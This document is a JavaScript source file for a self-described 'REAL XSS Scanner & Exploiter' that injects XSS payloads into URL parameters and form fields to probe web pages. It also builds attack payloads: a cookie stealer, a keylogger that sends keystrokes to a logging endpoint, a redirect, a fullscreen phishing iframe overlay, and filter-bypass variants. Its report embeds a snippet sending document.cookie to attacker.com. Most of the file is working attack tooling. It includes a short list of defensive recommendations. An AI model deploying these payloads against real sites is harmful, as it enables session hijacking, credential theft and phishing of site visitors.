/**
 * REAL XSS Scanner & Exploiter
 */

class XSSScanner {
    constructor() {
        this.payloads = [];
        this.vulnerable = false;
        this.loadPayloads();
    }
    
    loadPayloads() {
        this.payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<input onfocus=alert("XSS") autofocus>',
            '<video><source onerror=alert("XSS")>',
            '<audio src=x onerror=alert("XSS")>',
            '<div onmouseover=alert("XSS")>Hover</div>',
            '<a href="javascript:alert(\'XSS\')">Click</a>',
            '<form><button formaction="javascript:alert(\'XSS\')">Submit</button></form>',
            '<math><mi//xlink:href="data:x,<script>alert(\'XSS\')</script>">',
            '<table background="javascript:alert(\'XSS\')">',
            '<object data="javascript:alert(\'XSS\')">',
            '<embed src="javascript:alert(\'XSS\')">',
            '"><script>alert("XSS")</script>',
            '\'><script>alert("XSS")</script>',
            'javascript:alert(document.cookie)',
            '<img src="x" onerror="eval(atob(\'YWxlcnQoIlhTUyIp\'))">',
            '<script>fetch(\'/steal?cookie=\'+document.cookie)</script>'
        ];
    }
    
    async scanURL(url) {
        const results = [];
        
        // Test URL parameters
        const urlObj = new URL(url);
        const params = urlObj.searchParams;
        
        for (let [param, value] of params.entries()) {
            for (let payload of this.payloads) {
                const testURL = new URL(url);
                const testParams = new URLSearchParams(testURL.search);
                testParams.set(param, payload);
                testURL.search = testParams.toString();
                
                try {
                    const response = await fetch(testURL.toString(), {
                        method: 'GET',
                        mode: 'no-cors'
                    });
                    
                    const text = await response.text();
                    
                    // Check if payload is reflected
                    if (text.includes(payload.replace(/"/g, '&quot;'))) {
                        results.push({
                            param: param,
                            payload: payload,
                            type: 'Reflected XSS',
                            vulnerable: true,
                            url: testURL.toString()
                        });
                        this.vulnerable = true;
                    }
                    
                    // Check for script execution patterns
                    const scriptPatterns = [
                        /<script[^>]*>alert[^<]*<\/script>/i,
                        /onerror=["']alert\(/i,
                        /onload=["']alert\(/i,
                        /javascript:alert\(/i
                    ];
                    
                    for (let pattern of scriptPatterns) {
                        if (pattern.test(text)) {
                            results.push({
                                param: param,
                                payload: payload,
                                type: 'Executed XSS',
                                vulnerable: true,
                                url: testURL.toString()
                            });
                            this.vulnerable = true;
                            break;
                        }
                    }
                    
                } catch (error) {
                    results.push({
                        param: param,
                        payload: payload,
                        error: error.message
                    });
                }
                
                await this.delay(100);
            }
        }
        
        return results;
    }
    
    async scanForms(url) {
        const results = [];
        
        try {
            // Get page content
            const response = await fetch(url);
            const html = await response.text();
            
            // Parse forms (simplified)
            const formRegex = /<form[^>]*>(.*?)<\/form>/gis;
            let formMatch;
            
            while ((formMatch = formRegex.exec(html)) !== null) {
                const formHTML = formMatch[0];
                
                // Extract form action
                const actionMatch = formHTML.match(/action=["']([^"']+)["']/i);
                const action = actionMatch ? actionMatch[1] : url;
                
                // Extract input fields
                const inputRegex = /<input[^>]*name=["']([^"']+)["'][^>]*>/gi;
                const inputs = [];
                let inputMatch;
                
                while ((inputMatch = inputRegex.exec(formHTML)) !== null) {
                    inputs.push(inputMatch[1]);
                }
                
                // Test each input with XSS payloads
                for (let input of inputs) {
                    for (let payload of this.payloads) {
                        // Create test form data
                        const formData = new FormData();
                        formData.append(input, payload);
                        
                        // For other inputs, add dummy values
                        inputs.forEach(inp => {
                            if (inp !== input) {
                                formData.append(inp, 'test');
                            }
                        });
                        
                        try {
                            const testResponse = await fetch(action, {
                                method: 'POST',
                                body: formData,
                                mode: 'no-cors'
                            });
                            
                            const text = await testResponse.text();
                            
                            if (text.includes(payload) || text.includes('alert(')) {
                                results.push({
                                    form: action,
                                    input: input,
                                    payload: payload,
                                    type: 'Form XSS',
                                    vulnerable: true
                                });
                                this.vulnerable = true;
                            }
                            
                        } catch (e) {}
                        
                        await this.delay(100);
                    }
                }
            }
            
        } catch (error) {
            console.error('Form scan error:', error);
        }
        
        return results;
    }
    
    async stealCookies(targetUrl) {
        // Create cookie stealer payload
        const payload = `<script>fetch('${window.location.origin}/log?cookie='+document.cookie)</script>`;
        
        return {
            payload: payload,
            usage: 'Inject this payload to steal cookies',
            decoder: `${window.location.origin}/log.php`
        };
    }
    
    async keyloggerPayload() {
        const payload = `
<script>
document.onkeypress = function(e) {
    fetch('/log?key=' + e.key);
}
</script>
        `.trim();
        
        return {
            payload: payload,
            description: 'Keylogger payload',
            endpoint: '/log.php'
        };
    }
    
    async redirectPayload(redirectUrl) {
        const payload = `<script>window.location="${redirectUrl}"</script>`;
        
        return {
            payload: payload,
            action: 'Redirects victim to specified URL'
        };
    }
    
    async phishingSimulation(targetUrl, phishingUrl) {
        // Create iframe overlay payload
        const payload = `
<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;">
    <iframe src="${phishingUrl}" style="width:100%;height:100%;border:none;"></iframe>
</div>
<script>
// Hide original content
document.body.style.display = 'none';
setTimeout(() => document.body.style.display = 'block', 100);
</script>
        `.trim();
        
        return {
            payload: payload,
            description: 'Fullscreen phishing overlay',
            target: targetUrl
        };
    }
    
    async bypassFilters() {
        const bypassPayloads = [
            // Case variation
            '<ScRiPt>alert("XSS")</ScRiPt>',
            
            // Double encoding
            '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
            
            // UTF-8 encoding
            '&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert&#x28;&#x22;XSS&#x22;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;',
            
            // Without tags
            '" onmouseover="alert(\'XSS\')',
            "' onfocus='alert(\"XSS\")",
            
            // Event handlers without quotes
            '<img src=x onerror=alert(1)>',
            
            // SVG payloads
            '<svg><script>alert("XSS")</script></svg>',
            
            // JavaScript protocol
            'javascript:alert(document.domain)',
            
            // Data URI
            '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=">'
        ];
        
        return bypassPayloads;
    }
    
    async autoExploit(url) {
        const results = {
            url: url,
            reflected: [],
            stored: [],
            dom: []
        };
        
        // Test reflected XSS
        results.reflected = await this.scanURL(url);
        
        // Test form-based XSS
        results.stored = await this.scanForms(url);
        
        // Test DOM XSS (simplified)
        try {
            const response = await fetch(url);
            const html = await response.text();
            
            // Look for JavaScript that uses user input
            const scriptPatterns = [
                /document\.(write|writeln)\([^)]*\)/g,
                /innerHTML\s*=/g,
                /eval\([^)]*\)/g,
                /setTimeout\([^)]*\)/g,
                /location\.(hash|search)/g
            ];
            
            for (let pattern of scriptPatterns) {
                const matches = html.match(pattern);
                if (matches) {
                    results.dom.push({
                        pattern: pattern.toString(),
                        matches: matches.length,
                        potential: 'DOM XSS possible'
                    });
                }
            }
            
        } catch (e) {}
        
        return results;
    }
    
    async generateReport(target) {
        const scanResults = await this.autoExploit(target);
        
        const report = {
            timestamp: new Date().toISOString(),
            target: target,
            vulnerabilities: {
                reflected: scanResults.reflected.filter(r => r.vulnerable).length,
                stored: scanResults.stored.filter(r => r.vulnerable).length,
                dom: scanResults.dom.length
            },
            payloads: this.payloads.slice(0, 10),
            recommendations: [
                'Implement Content Security Policy (CSP)',
                'Use X-XSS-Protection header',
                'Enable HttpOnly flag for cookies',
                'Implement input validation and output encoding',
                'Use modern frameworks with built-in XSS protection'
            ],
            exploitCode: `
// Example exploit for vulnerable parameter
function exploitXSS(target, param, value, payload) {
    const url = new URL(target);
    url.searchParams.set(param, payload);
    window.open(url.toString(), '_blank');
}

// Cookie stealer payload
const cookieStealer = '<script>new Image().src="http://attacker.com/steal?c="+document.cookie;</script>';
            `.trim()
        };
        
        return report;
    }
    
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

window.XSSScanner = XSSScanner;